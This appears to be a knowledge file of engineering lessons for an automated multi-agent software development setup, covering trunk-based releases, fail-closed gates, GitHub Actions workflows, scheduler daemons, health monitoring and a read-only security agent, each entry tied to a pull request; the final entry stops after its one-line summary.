trunk-release-cut-model.l0: Trunk + release-cut closes deployment drift: main = single living line; releases are tags/branches cut from main.
trunk-release-cut-model.l1: PR #86 (P1 A2A dev-society on main): v0.5-development was a long-lived parallel branch requiring constant sync with main — deployment drift was inevitable. Fix: main = trunk developed 24/7 by the mesh; deployments are releases cut from main when mature (git tag v1.0 or a v1.0 branch). Upgrade = cut a new release from main and redeploy. The parallel branch becomes redundant. Also: when a persistent daemon adopts an issue class via a new label (route:a2a), add a 'skip if has label' guard in every other workflow to prevent double-building.
trunk-release-cut-model.value:
Adopt main as the single trunk for any automated development society. Automation (mesh, daemon, scheduled jobs) develops it continuously. Release model: cut a tag (git tag vX.Y) or a branch (vX.Y-stable) from main when stable enough; deploy THAT, not main directly. Upgrade = cut a new release from the current trunk state.

Never keep a long-lived parallel branch (e.g. vN-development) in sync with main — each sync is manual overhead and divergence accumulates silently until you have two de facto trunks.

When a new automation path (daemon, scheduled poller) adopts an issue class via a new label (e.g. route:a2a): immediately add a 'skip if label present' guard in every OTHER workflow that would otherwise build the same issue — prevents double-builds and conflicting concurrent runs.

Provenance: PR #86 (2026-06-18).

provenance.source: PR #86: feat(dev-society): land P1 on main (single trunk line) + trunk/release model

daemon-polling-idempotency.l0: Polling daemon: exclude ALL in-flight labels from eligibility + fail-closed on null/ambiguous gate inputs.
daemon-polling-idempotency.l1: PR #90 fixed C1: isEligible passed pr:in-review issues to the Coder, re-selecting items already under active PR development. Also T2: shouldOpenPR({tests:null}) returned truthy, creating PRs when no CI run had occurred. Both silent failures — no crash, just repeated work or spurious PR creation. Root cause: eligibility checked some but not all in-flight labels; gate function lacked a positive-confirmation requirement.
daemon-polling-idempotency.value:
(1) Eligibility: every label denoting active ownership (pr:in-review, in-progress, blocked) must appear in isEligible — missing any one silently allows duplicate processing. Test each in-flight label as an explicit negative case.
(2) Gate functions: require confirmed positive state (e.g. !!tests && tests.passed === true), NOT merely absence of explicit failure. shouldOpenPR(null) → false; shouldMerge(null) → false. 'No data' is not 'ok'.
Applies to any polling daemon or work-queue consumer. Provenance: PR #90 (2026-06-18), closes Issue #87.

jq-tab-delimiter-safety.l0: jq output joined by '|' silently corrupts IFS read when PR titles contain '|' — use '\t' as the multi-field delimiter.
jq-tab-delimiter-safety.l1: PR #96 review: dev-mesh-pr-janitor.yml Step 2 used '|' to join number/headRefName/updatedAt. A PR title like 'feat: foo|bar' splits into 4 fields instead of 3 — $head received the wrong value, nudging the wrong branch. All three janitor gh pr list steps now use '\t' as the join delimiter and IFS=$'\t' read -r in bash. The failure is silent: no error, wrong branch nudged.
jq-tab-delimiter-safety.value:
Pattern: when jq outputs multiple fields for shell consumption, always use the tab character as the join delimiter. Never use '|', ',', or ':' — these appear in PR titles, commit messages, branch names, and other user-controlled strings.

jq side: `jq -r '[.number, .headRefName, .updatedAt] | join("\t")'`
Shell side: `IFS=$'\t' read -r pr head updated <<<"$row"`

Why '|' fails silently: the shell does NOT error on extra fields — excess content is appended to the last variable (or discarded), so $head receives 'branch-name|rest-of-title\t...' instead of the branch name alone. The wrong branch is then fetched/pushed.

Also from PR #96: the fork-PR guard (isCrossRepository==false) must appear in EVERY gh pr list query that drives a write action (close, push, open issue). Assert the guard appears >= N times in the workflow YAML (N = number of acting pr list steps) so adding a step forces a deliberate update.

Provenance: PR #96 (2026-06-18), review fix for pipe-delimiter fragility in janitor Step 2.

provenance.source: PR #96: Port #81 to main — review fix for pipe-delimiter fragility in janitor Step 2

pr-janitor-gap-classes.l0: A PR janitor handles the three gap classes no sweep catches: scope drift, UNKNOWN mergeability, unlabelled bot PRs.
pr-janitor-gap-classes.l1: memory-automerge, mergefix, and autofix all filter on label/merge-state — a PR failing the wrong precondition accumulates forever. PR #81: (1) memory:promote PRs with non-memory files → close with diagnostic (automerge's file-scope guard silently skips them); (2) PRs stuck UNKNOWN >1h → push empty commit to nudge GitHub (mergefix only touches DIRTY); (3) unlabelled bot PRs >24h → open needs-triage issue (all sweeps filter by label). Three reversible actions; never merges.
pr-janitor-gap-classes.value:
Add a PR janitor (scheduled cron, offset from other sweeps — e.g. '20,50 * * * *', never on push) that handles the gap classes no specialized sweep catches:

1. Scope drift: for label-scoped PRs (e.g. memory:promote) that include files outside the expected path prefix — the domain sweep's file-scope guard silently skips them. Action: gh pr view N --json files --jq '.files[].path', grep -vE '^expected/path/', close with structured diagnostic comment explaining drift files and how to re-emit a clean PR.

2. UNKNOWN mergeability stuck >1h: mergefix only handles DIRTY (conflicted) PRs; automerge only handles MERGEABLE PRs; an UNKNOWN PR is invisible to both. Action: push an empty commit (git commit --allow-empty -m 'chore: nudge [janitor]', git push) to trigger GitHub recompute. Preferred over close+reopen — preserves approvals. Measure age from updatedAt epoch (not createdAt).

3. Unlabelled bot PRs >24h: backlog/automerge/mergefix all filter by label; a bot PR with no labels is invisible. Action: open a needs-triage issue linking the PR (do NOT close — work may be valid). Dedup: search existing issues by title 'in:title PR #N' before creating. Scope to bot authors only (*[bot], claude*, github-actions*, dependabot*).

Safety invariants: never merges, never force-pushes. Use DEV_MESH_PAT || GITHUB_TOKEN for empty-commit pushes (GITHUB_TOKEN cannot push refs that update workflow files). concurrency group: cancel-in-progress: false. Related: ci-sweep-silent-skip-antipattern, event-driven-polling-backstop. Provenance: PR #81 (2026-06-18), fixing Issue #76.

provenance.source: PR #81 (2026-06-18): [codex] harden dev mesh OAuth runtime and sync

doctor-apply-on-framework-upgrade.l0: New framework wiring → re-run `doctor --apply`; commit only portable agent content, not env-specific wiring.
doctor-apply-on-framework-upgrade.l1: PR #106: main gained board-notify SessionStart hook + peer-bridge .mcp.json wiring. All 7 dev-mesh agents predated it → 60+ conformance failures. `doctor dev-mesh --apply` fixed all. Per .gitignore: registry.json/.mcp.json/settings.json NOT committed (absolute-path-bound; regenerated per deployment). Portable content to commit: agent.json (meshVersion restamp), prompts/ (system.md/ask.md/do.md seeds), scaffold dirs (.agent/, deliverables/, output/). Verify: `validate dev-mesh` → Conformance: OK.
doctor-apply-on-framework-upgrade.value:
After any main merge that introduces new framework wiring (SessionStart hooks, bridge MCP config, or new env stamps), resync all mesh agents: `agent-mesh doctor <mesh-dir> --apply`.

Verify: `agent-mesh validate <mesh-dir>` → Conformance: OK. Record failure count before/after.

Commit only portable content:
- agent.json (meshVersion restamp clears 'version not declared' warnings)
- prompts/system.md, prompts/ask.md, prompts/do.md (seeded if missing)
- scaffold .gitkeeps: .agent/{memories,rules,reference,workflows,artifacts}/, deliverables/, output/

Never commit env-specific generated wiring:
- registry.json (embedded absolute peer spawn paths)
- .mcp.json (embedded absolute MESH_ROOT/MESH_CEILING paths)
- settings.json (machine-absolute hook paths)

These embed absolute paths at generation time — each deployment regenerates them locally. Committing them breaks every other operator's checkout.

Verify .gitignore excludes: `*/registry.json`, `*/.mcp.json`, `mesh/mcp.json`, machine-absolute settings.json.

Provenance: PR #106 (2026-06-18): dev-mesh re-init after board-notify SessionStart hook + peer-bridge wiring landed on main.

os-service-installer-generate-at-install.l0: OS service units: generate from detected absolute paths at install time; never commit generated .plist/.service files.
os-service-installer-generate-at-install.l1: PR #108: dev-society-install.sh generates launchd (macOS) or systemd --user (Linux) units from paths detected at install time (command -v, $0 resolution). Committed: the install script + portable env config (POLL_MS, DAILY_REPORT_HOUR, AGENT_MESH_CLAUDE). Not committed: .plist/.service/.timer files (absolute-path-bound — identical invariant to registry.json/.mcp.json; see doctor-apply-on-framework-upgrade). Bundle daemon + scheduled companion in one installer so they stay in sync and uninstall atomically.
os-service-installer-generate-at-install.value:
Pattern for cross-platform OS service installation:

(1) Detect at install time: OS (uname -s), absolute executable path (command -v node, command -v claude), repo root ($REPO resolved to absolute). Never hard-code paths.

(2) Emit unit files from heredocs — never commit them. macOS: generate .plist under ~/Library/LaunchAgents/<label>.plist. Linux: generate .service + .timer under ~/.config/systemd/user/. Load immediately after generation (launchctl load / systemctl --user enable --now).

(3) Persist only portable config: env vars like DEV_SOCIETY_REPO, POLL_MS, DAILY_REPORT_HOUR, AGENT_MESH_CLAUDE. The env file survives re-install; generated units are regenerated each time.

(4) Bundle related units in one script with consistent subcommands: install / install-report / status / logs / restart / uninstall. uninstall removes BOTH daemon + scheduled unit atomically.

(5) Include --selftest before unit load: fail fast if the daemon cannot start. Avoids loading a broken unit that loops on restart.

Related: doctor-apply-on-framework-upgrade (same absolute-path invariant for framework wiring). Provenance: PR #108 (2026-06-18).

provenance.source: PR #108 (2026-06-18): feat(dev-society): 24/7 installer + daily-report scheduling (launchd/systemd)

v2-migration-delete-v1.l0: v1→v2 UI cutover: delete v1 source + tests in the same PR that promotes v2 to root — never dual-maintain.
v2-migration-delete-v1.l1: PR #110: board2 became the sole dashboard (serves `/`); index.html/app.js/app.css + session-log-frontend.test.js deleted in the same PR. Dead v1 code imposes double test overhead, routing ambiguity, and stale docs. Once v2 is route-proven and test-covered, v1 artifacts have no incremental value. Live-verification (endpoints 200, old entry points 404) is the gating condition before deletion.
v2-migration-delete-v1.value:
Pattern for v1→v2 UI migrations:

(1) Build v2 alongside v1 at a different route (e.g. /board2).
(2) Live-verify v2: all expected endpoints respond 200, old entry points 404, features work.
(3) Cutover PR: update server root route to serve v2. In the SAME PR: delete v1 source files (index.html, app.js, app.css) AND their dedicated test files (e.g. session-log-frontend.test.js). Repoint route-serving tests to the v2 filenames. CI stays green throughout — the v2 tests were already present before v1 deletion.
(4) Never defer v1 removal. Once merged, dead code accumulates merge conflicts, confuses file searches, and doubles maintenance on every future change to shared deps. 'Temporary' legacy code becomes permanent. Provenance: PR #110 (2026-06-18), feat(dashboard): top-level live Graph view; remove legacy v1 dashboard.

subsystem-promote-and-daemon-guard.l0: Relocate cross-cutting subsystems to dedicated modules; guard daemon services against --once/--selftest modes.
subsystem-promote-and-daemon-guard.l1: PR #112 promoted the scheduler from src/dashboard/ to src/schedule/ when it became mesh-wide infrastructure. The daemon starts createScheduler 24/7 but guards against --once/--selftest: those are single-pass modes that must exit cleanly. A background service started in them leaks beyond the sweep. Guard: `if (!opts.once && !opts.selftest) { svc.start(); process.on('SIGTERM', () => svc.stop()); }`. New test: daemon-scheduler.test.js asserts clean selftest exit.

default-off-three-layer-kill-switch.l0: Default-OFF automation: fail-closed predicate + env-flag CLI + YAML vars gate; operator flip activates, nothing else.
default-off-three-layer-kill-switch.l1: PR #124 (gated auto-merge sweep): isAutoMergeable is a pure fail-closed fn — undefined/garbage → not mergeable; `enabled !== true` → empty list. CLI: `enabled = ENV === 'true'` (string-exact, not truthy). YAML: `if: vars.AUTOMERGE_ENABLED == 'true'`. All three default OFF. Hold-label check catches both object shapes and raw strings. Merging the code is safe; feature stays inert until the operator explicitly sets the repo variable. Hermetic tests cover all paths without a real merge.
default-off-three-layer-kill-switch.value:
Three-layer kill-switch pattern for default-OFF automation:

(1) Pure fail-closed predicate: function returns [] / false for ALL missing or non-true inputs. Type-check strictly (`=== false`, `=== true`) — undefined/null/garbage → not eligible. Hold labels: check both object shape (`.name`) and raw string so the same code handles both API shapes. `enabled !== true` → early-return empty, so even partial env values cannot activate the sweep.

(2) CLI gate: `const enabled = process.env.FLAG === 'true'` — pass `enabled` as an explicit arg into the pure function. Never use truthy coercion (`!!flag` vs `flag === 'true'`). Document the exact activation command: `gh variable set AUTOMERGE_ENABLED --body true`.

(3) YAML gate: `if: vars.FLAG == 'true'` in the job-level condition. GitHub Actions vars context is always a string; `== 'true'` is correct (not `!= 'false'` or truthy). Unset variable → condition is false → job skipped entirely, no gh calls at all.

All three layers independently default OFF — defense in depth means no single layer's misconfiguration triggers behavior.

Verify coverage: (a) hermetic unit tests exercise pure predicate with all partial/corrupt input combinations — no real merge needed; (b) `--dry-run` CLI flag validates eligibility logic live without merging; (c) unset or `'false'` YAML var → job skips, observable in Actions UI.

Deactivation is instant: set the variable to false or delete it. Provenance: PR #124 (2026-06-19).

provenance.source: PR #124: feat(mesh): gated auto-merge sweep (Phase 1, default-OFF)

scheduler-builtin-return-shape.l0: Daemon scheduler builtins must return {status:'ok'} — void/undefined breaks onJobResult.
scheduler-builtin-return-shape.l1: PR #127 final review caught a Critical: the `issue-sweep` builtin initially returned void (sweep() is async with no explicit return). The scheduler executor's onJobResult reads `.status` from the return — undefined.status silently miscategorises the run. Fixed by wrapping: `.then(() => ({status:'ok', output:'issue-sweep complete'})).catch(e => ({status:'fail', error:e.message}))`. Every `kind:builtin` entry in schedule.json must return `{status:'ok'}` or `{status:'fail', error}` — never void.
scheduler-builtin-return-shape.value:
Apply when registering any new builtin in the dev-society daemon scheduler:

(1) Always return an explicit status object. Pattern:
`builtins['name'] = () => work().then(() => ({status:'ok', output:'...'})).catch(e => ({status:'fail', error:e.message}));`
For async/await style: `builtins['name'] = async () => { await work(); return {status:'ok'}; }`

(2) When wrapping an existing async sweep function (e.g. sweep() returns void): do NOT assign directly as `builtins['x'] = sweep` — the void return propagates. Wrap with `.then`/`catch` or an async wrapper that ends with `return {status:'ok'}`.

(3) The executor's onJobResult logs `status === 'ok'` as info and everything else as warn. A void return means status is `undefined`, not 'fail' — the run appears to succeed while the job result is silently wrong.

Symptom: job-run log entries show `undefined` as the status instead of 'ok' or 'fail'.

This was caught only by the final code review of PR #127 (2026-06-19) — there is no runtime validation of the return shape at registration time. Provenance: PR #127.

provenance.source: PR #127: feat(dev-society): label-aware 10-min issue sweep (maintainer-owned)

intake-poll-lifecycle.l0: Multi-step label pipelines stall without a poll — events fire once but never re-trigger intermediate state advances.
intake-poll-lifecycle.l1: dev-mesh-intake.yml was event-only (issues/issue_comment) so once the Analyst moved an issue to 'discussing' or 'spec:draft', nothing re-triggered it — issues stalled mid-pipeline needing human nudges. PR #91 added a 30-min poll (cron: '5,35 * * * *') + workflow_dispatch. Poll mode advances up to 3 pre-approval issues/run (FIFO). Concurrency group must use github.event.issue.number||'poll' — event.issue.number is null in scheduled runs.
intake-poll-lifecycle.value:
For any GitHub Actions workflow that manages a multi-step label lifecycle (e.g. idea → discussing → spec:draft → spec:in-review):

(1) Retain event triggers (issues, issue_comment) for immediate response on new activity.
(2) Add a schedule (e.g. '5,35 * * * *') as the advancement pump for stuck intermediate states — the cron runs even when no new event fires.
(3) Cap the batch size in poll mode (≤3 issues/run) to avoid timeouts on large backlogs.
(4) Use github.event.issue.number||'poll' in the concurrency group key — event.issue.number is null in schedule/workflow_dispatch runs and a null-derived group key produces unexpected concurrency behavior.
(5) In poll mode, list open issues in pre-approval states, sort FIFO by number, and advance each by one honest step.

Distinct from event-driven-polling-backstop (which guards against missed webhook delivery) — here the issue is that no re-triggering event exists at all after the initial state change; the schedule is the only driver. Provenance: PR #91 (2026-06-18).

provenance.source: PR #91: feat(dev-mesh): intake polls to auto-advance the pre-approval pipeline

integration-ref-trunk-staleness.l0: INTEGRATION_REF must track main under trunk-based dev — stale branch silently validates dead code for all nightly tiers.
integration-ref-trunk-staleness.l1: PR #100: INTEGRATION_REF was pinned to v0.4-development, which was 188 commits behind main — the nightly L1/L2/L3/L4 tiers had been validating long-stale code for an extended period without any alert. Under trunk-based development, main is the single living line; retiring feature/development branches but leaving INTEGRATION_REF pointing at them means every nightly scorecard result (behavior evals, adversarial battery, perf benchmark) quietly tests the wrong code. The 188-commit gap was only discovered by inspection, not by a CI alert.
integration-ref-trunk-staleness.value:
Checklist when retiring a feature/development branch under trunk-based development:

1. INTEGRATION_REF → main: update it in the same PR that retires the branch. A stale INTEGRATION_REF never causes an error or alert — all nightly jobs succeed but each validates dead code.
2. Lint-encode the target ref: the integration-workflow.test.js assertion on `INTEGRATION_REF: main` (landed with PR #100) makes any future change a deliberate, test-gated act. Every CI pipeline variable naming a branch should have a hermetic lint equivalent.
3. Align the schedule trigger: the nightly fires from the default branch (`main`) and checks out INTEGRATION_REF explicitly. If those diverge, a workflow_dispatch from main still tests the stale ref while the schedule appears to work. Verify both always name the same living line.
4. Scope-check stale refs after ANY branch cleanup: grep all workflow files for retired branch refs immediately after the cleanup — INTEGRATION_REF is a silent misconfiguration until the next nightly run.

Provenance: PR #100 (2026-06-18): chore(integration): retarget the nightly to main (trunk-based development).

provenance.source: PR #100: chore(integration): retarget the nightly to main (trunk-based development)

new-agent-scaffold-completeness.l0: New agents need 7 scaffold .gitkeeps alongside content — fresh checkout fails validate until doctor seeds them.
new-agent-scaffold-completeness.l1: PR #122: security agent shipped agent.json/AGENT.md/prompts/skills but not the 7 scaffold .gitkeep dirs (.agent/{memories,rules,reference,workflows,artifacts}/, deliverables/, output/). Fresh checkout fails `validate dev-mesh` with 7 missing-directory errors. CI missed it because the hermetic suite runs doctor --apply on a copy first, and the live mesh auto-seeds at runtime — so a missing-scaffold commit appears green in CI while failing on fresh checkout.
new-agent-scaffold-completeness.value: When adding a new agent to the dev-mesh, commit the full scaffold .gitkeeps alongside the real content in the same PR. Required scaffold dirs: .agent/{memories,rules,reference,workflows,artifacts}/, deliverables/, output/ (7 .gitkeep files — same set as every existing agent). Verify before merging: run `node ./bin/agent-mesh.js validate <mesh>` on the branch — must show Conformance: OK. The hermetic CI suite (npm test) runs doctor --apply on a temp copy, so a missing-scaffold PR appears green in CI while failing validate on a fresh checkout. Related: doctor-apply-on-framework-upgrade (run doctor --apply after framework upgrades to resync existing agents). Provenance: PR #122 (2026-06-19).

provenance.source: PR #122 (2026-06-19): fix(dev-mesh): seed the security agent's missing scaffold dirs

fail-safe-observability-daemon.l0: Daemon observability calls must be fail-safe: log writes that throw are an availability bug, not a logging bug.
fail-safe-observability-daemon.l1: PR #126: recordActivity wraps all file I/O in try/catch, no re-throw — a filesystem error must never crash the daemon loop. Three complementary invariants: (1) mode guard suppresses emits under --selftest/--once (single-pass must not produce side-effect files); (2) the read-API route returns [] / 2xx on error, never 500; (3) event strings are HTML-escaped before render. Activity log is the daily-rotating journal; run logs remain the per-run detail layer.
fail-safe-observability-daemon.value:
Four invariants for adding cross-cutting observability to a daemon service:

(1) Fail-safe emit: wrap every log-write in try/catch with no re-throw. Filesystem errors (full disk, bad permissions, missing dir) must never propagate into the daemon loop — a crash in the logger is a service outage. Pattern: `try { await appendFile(path, line); } catch { /* swallow */ }`

(2) Mode guard: gate ALL emits on `!opts.selftest && !opts.once` — single-pass invocations (health checks, one-shot runs) must exit cleanly without producing side-effect log files. Assert in tests: run `--selftest`, verify no activity files created.

(3) Tolerant read route: the observability API (GET /api/activity-log) must catch all errors and return [] / 2xx, never a 500. A broken log reader must not disable the dashboard that depends on it.

(4) XSS-safe render: pass every event field (summary, agent, ref, detail) through an HTML-escape fn before innerHTML. Event payloads are service-generated but may relay user-originated strings — treat as untrusted.

Two-layer separation: activity log = high-level event stream (issue.picked / delegate.done / job.run); per-agent run logs = granular detail, linked by `ref`. Don't collapse them.

Provenance: PR #126 (2026-06-19).

provenance.source: PR #126: feat(mesh): unified activity log + filterable dashboard panel (Phase 1)

cached-report-compute-and-schedule.l0: Cached report: each KPI needs both aggregation AND a refresh schedule — script without scheduler goes stale.
cached-report-compute-and-schedule.l1: PR #120: issues.openNow absent from aggregate.js despite openIssues being passed (prs.openNow existed). AND daily-report-refresh had no scheduler despite PR #108 shipping the script — cache stuck 2 days old. Fix: one-line aggregation + builtin at 00:10 on the orchestrator. Symmetric parallel KPIs (prs/issues) are a completeness hint: if one is tracked, the other must be too.
cached-report-compute-and-schedule.value:
Pattern for adding a new KPI to a cached report:

(1) Aggregation: if a parallel metric exists (e.g. prs.openNow), its counterpart (issues.openNow) must also be computed. The input param may already be passed but not projected into the output. Symptom: wrong count on dashboard — structurally absent, not stale.

(2) Schedule wiring: a report script without a refresh schedule produces correct data once and goes stale. Wire a builtin on the orchestrator (e.g. daily-report-refresh at 00:10) — same pattern as gh-activity-poll. Symptom: cache age >> expected cadence.

(3) Verify both: run the script manually (--cache-only, no --post) to confirm the new field appears; confirm daemon selftest exits cleanly; confirm dashboard renders the live total.

Red flag: cache age >> expected period implies scheduler not wired — check script has a builtin before debugging aggregation logic.

Symmetry hint: parallel KPI pairs (PRs/Issues, open/closed, pass/fail) must be tracked at the same aggregation depth. A one-sided pair is almost always a missed step.

Provenance: PR #120 (2026-06-19).

provenance.source: PR #120 (2026-06-19): fix(report): correct open-issue count on the dashboard + schedule the daily report

daemon-health-observer-pattern.l0: Health daemon: snapshot before escalation; limit heals to reversible state writes; suppress flapping via seenCount.
daemon-health-observer-pattern.l1: Run order: gather → assess → write snapshot → escalate. Snapshot FIRST — ensures dashboard/API always has data even if issue creation fails. Wrap the runner in try/catch → {status:'fail'}, never throw — health loops must be fail-closed. Suppress flap escalations via `seenCount`; only escalate persistent findings. Self-heal scope: reversible atomic state writes only (clear stale `running` flag, recompute `nextRunAt`); auto-disable, out-of-cadence retry, and process restarts escalate instead. For builtin jobs with no run-log, track `consecutiveFailures` in scheduler state.
daemon-health-observer-pattern.value:
Pattern for a daemon health-observer loop (PR #118 — mesh heartbeat Phase 3):

(1) Run order: gather → assess → apply heals → write snapshot → route escalations. ALWAYS write the snapshot before routing escalations. The snapshot is what the dashboard/API/GET /api/health serves; if issue creation fails or is slow, the snapshot still reflects the latest assessed health.

(2) Fail-closed runner: wrap the entire runner body in try/catch → return {status:'fail'}; never let it throw. A crash in the health observer must not kill the daemon — it records its own failure and the next tick retries.

(3) Flap suppression via seenCount: carry a `seenCount` for each finding across ticks. Only escalate (open/update a GitHub issue) when seenCount exceeds a threshold. This prevents a single transient glitch from opening an issue. Close/resolve issues when the finding disappears.

(4) Minimal-safe self-heal scope: heals must be purely reversible atomic state writes. Allowed: clear a stale `running` lock, recompute `nextRunAt` for an overdue job. Not allowed (escalate instead): disabling a job, triggering an out-of-cadence retry, restarting a process. The daemon cannot revive itself — that's the OS service manager's job (launchd/systemd).

(5) Severity precedence in classification: stuck > failing > overdue. When a finding matches multiple classes, apply the highest-severity label so dashboards and escalations always show the worst condition first.

(6) Disable via INTERVAL_MS=0: add an env-var circuit breaker (e.g. `AGENT_MESH_HEARTBEAT_INTERVAL_MS=0`) to disable the loop without code changes — useful for debugging or cost control.

(7) Builtin jobs with no run-log: the failure-streak inference that works for claude/delegate jobs (read log files) doesn't work for builtin scheduler jobs that write no run-log. Track `consecutiveFailures` explicitly in the scheduler's per-job state (++ on tick failure, reset to 0 on success).

Test coverage: assess unit tests (all severity classes + edge cases); runner tests (snapshot written before issue call, try/catch → status:fail); daemon test (heartbeat setInterval not started in --selftest/--once mode). Hermetic: inject applyHeal and openIssue as stubs. Provenance: PR #118 (2026-06-19).

provenance.source: PR #118 (2026-06-19): feat(mesh): Phase 3 — mesh-level self-healing heartbeat

security-role-ask-only-reporter.l0: Security specialist: ask-only, OAuth, issues-only — no write/merge authority, no PR trigger, no outbound peers.
security-role-ask-only-reporter.l1: PR #116: dedicated security role that inspects continuously — never writes or merges. Invariants: (1) ask-only (no Edit/Write/Bash(git:*) tools); (2) CLAUDE_CODE_OAUTH_TOKEN not DEV_MESH_PAT — OAuth cannot push to .github/workflows; (3) findings reported as GitHub issues only — no PR reviews, no auto-closes; (4) no pull_request trigger — fork-PR content cannot receive secrets; (5) no outbound peers in mesh.json — sees all, controls nothing; (6) --advisory-blocked flag passed (read-probe denials are expected noise). Pattern: separate 'inspect and report' from all 'fix and merge' duties.
security-role-ask-only-reporter.value:
Pattern for adding a security specialist role to an autonomous agent society:

(1) Agent role: create dev-mesh/security with ask-only mode. No Edit, no Write, no Bash(git:*) in allowedTools. No outbound peers in agent.json — security sees all, controls nothing.

(2) Three-lens coverage: (a) Injection — prompt/workflow injection, unsafe shell interpolation (${{ head.ref }} in run:), fork PR secret exposure; (b) Identity/auth — OAuth-only Claude auth, least-privilege GitHub permissions, same-repo guards, credential masking; (c) Token budget — bounded autonomous loops, per-branch retry caps, usage capture, human-visible budget exhaustion paths.

(3) Workflow auth: use CLAUDE_CODE_OAUTH_TOKEN not DEV_MESH_PAT. OAuth cannot push to .github/workflows — a security agent that can self-edit CI is a conflict of interest. Trigger: schedule (cron, e.g. every 6h) + manual dispatch only. Never pull_request — fork PRs can exfiltrate secrets if the trigger runs in the wrong context.

(4) Permissions: `contents: read, issues: write`. Security cannot push. Issues:write only for findings alerts. Never open/close/merge PRs.

(5) Honesty gate: shared assert-run-healthy.mjs with --advisory-blocked (ask-role flag). Read-probe denials are expected noise, not failure (see honesty-gate-role-scoped).

(6) Mesh wiring: route via Maintainer (add Security as peer in maintainer/agent.json). Topology test assertions: Security is ask-only; Maintainer peers include Security; Security has zero outbound peers.

(7) Tests: dev-mesh-agents.test.js guards role set, ask-only flag, peer topology; dev-mesh-workflow.test.js guards schedule trigger, no PR trigger, OAuth sanitation, postrun gate, three security lenses in prompt. Write tests first — they are the living spec.

Provenance: PR #116 (2026-06-19).

provenance.source: PR #116 (2026-06-19): [codex] add scheduled dev-mesh security agent

scheduler-builtin-for-native-jobs.l0: Scheduler builtin: register native polling fns in-process; no LLM spawn; unknown name → fail-state.
scheduler-builtin-for-native-jobs.l1: PR #114 added a builtin kind to the mesh scheduler: instead of spawning delegateTask (a claude -p subprocess), a builtin runs an in-process function (e.g. pollGhActivity calling gh run list). Name is a key in a fixed registry; unknown name → fail-state record, never throws — consistent with failure-is-data. Delegate jobs unaffected. Guard daemon-started builtins with !opts.once && !opts.selftest (see subsystem-promote-and-daemon-guard). External builtin data should merge tolerantly into API responses: missing/corrupt/non-array cache → degrade to local-only.
scheduler-builtin-for-native-jobs.value:
Pattern: when a mesh scheduled job performs native operations (gh run list, git, external API poll) that do NOT require an LLM, implement it as a scheduler `builtin` instead of a `delegateTask`.

(1) Register the function in an in-process builtin registry (not in schedule.json). schedule.json carries { "kind": "builtin", "name": "my-job-name" }. The name is a lookup key — the value is never arbitrary code. Unknown builtin name → fail-state job record, never throws and never spawns anything.

(2) Additive: existing delegate jobs are unaffected. The scheduler dispatches to the correct path by kind.

(3) Daemon guard: register builtins inside the `!opts.once && !opts.selftest` block so single-pass sweep/health invocations exit cleanly (see subsystem-promote-and-daemon-guard).

(4) Workflow→agent name convention: when a builtin polls external CI systems (e.g. gh run list), map workflow names to mesh role agents by naming convention (e.g. 'dev-mesh-coder' → coder agent). This lets cloud CI work appear in the live activity graph without those agents writing local run-logs.

(5) Tolerant snapshot merge: data written by a builtin (a cache file) should be merged tolerantly into API responses. Missing file, corrupt JSON, or non-array value → silently degrade to local-only data. Never let a missing cache crash the live API.

Test coverage: (a) known builtin name → calls registered fn, returns result; (b) unknown builtin name → fail-state record, no throw; (c) delegate jobs still route correctly. Hermetic: use dependency injection so the builtin fn is a no-op stub. Provenance: PR #114 (2026-06-19).

provenance.source: PR #114 (2026-06-19): feat(mesh): Phase 2 — GitHub-Actions activity poller (orchestrator agent)

reviewer-sticky-changes-requested.l0: GitHub CHANGES_REQUESTED is sticky — always have an APPROVE path or PR stays red after clean passes.
reviewer-sticky-changes-requested.l1: PR #101: dev-mesh-review.yml had no APPROVE path — every follow-up pass downgraded to COMMENT, never clearing the sticky state. CI went green, review stayed red forever. Fix: binary verdict per commit — BLOCKING finding → REQUEST_CHANGES, no blocking → APPROVE with nits as optional notes. 'CI green + APPROVED' is now the true merge-ready signal, preventing review loops.
reviewer-sticky-changes-requested.value: Classify each review finding as BLOCKING or non-blocking before submitting. Emit exactly one verdict per commit: (1) gh pr review --request-changes if any blocking finding; (2) gh pr review --approve with nits as optional notes if none. This clears sticky CHANGES_REQUESTED — COMMENT-only follow-ups never clear it. Merge-ready definition: CI green AND latest review = APPROVED AND no unresolved blocking threads. Non-blocking nits must not withhold approval and must not be re-raised (loop prevention). Apply to any autonomous reviewer using gh pr review. Provenance: PR #101 (2026-06-18).

provenance.source: PR #101: fix(dev-mesh): reviewer emits an explicit approve verdict (fix red-but-merge-ready)

agent-prompt-dedupe-cap-on-frequency-inc.l0: Raise schedule frequency only with dedupe-first + per-run cap in the agent prompt — else daily runs spam the queue.
agent-prompt-dedupe-cap-on-frequency-inc.l1: PR #85 changed the Analyst from weekly to daily. Without guardrails the agent re-proposes the same ideas each morning, flooding the issue backlog. Fix: embed in the prompt — (1) list open issues first ('dedupe-first'), (2) propose only genuinely-new directions, (3) cap at 1–2 per run, (4) file nothing if nothing new qualifies. Both safeguards are necessary: dedupe alone still lets a chatty model treat near-duplicates as new; a cap alone still lets covered ideas through.
agent-prompt-dedupe-cap-on-frequency-inc.value:
Pattern for increasing the schedule frequency of any recurring proposal/research agent:

1. Dedupe-first instruction: 'List current open issues first (gh issue list --state open --limit 100) — do NOT propose anything already covered by an existing Issue.'
2. Per-run cap: explicitly state the max items (e.g., 'at most 1–2 genuinely NEW, non-duplicate directions per run').
3. Zero-item exit: 'if nothing new is worth filing today, file NOTHING and stop.' This must be explicit — agents default to producing output unless told zero is acceptable.
4. Quality framing: 'Quality over volume — never spam the backlog.' Frames the constraint positively so the model understands intent.

All four lines are mandatory when moving a proposal-loop agent from weekly/monthly to daily. Mental check: if the agent ran 7 consecutive days with no new research, would it produce 0 issues or 7 duplicate issues? The prompt must produce 0.

Also applicable to: backlog triagers, spec-proposal agents, idea generators — any role that files durable artifacts into a human-consumed queue. Do NOT rely on the queue consumer to dedupe — deduplication must happen at the source (the agent) to keep signal-to-noise high for human reviewers.

Provenance: PR #85 (2026-06-18) — feat(dev-mesh): research Analyst runs daily + dedupes.

provenance.source: PR #85: feat(dev-mesh): research Analyst runs daily + dedupes — keep the idea queue fed

deterministic-union-backlog-drain.l0: Shared-file PRs accumulate faster than LLM mergefix can drain — add deterministic keyed-union in the automerge sweep.
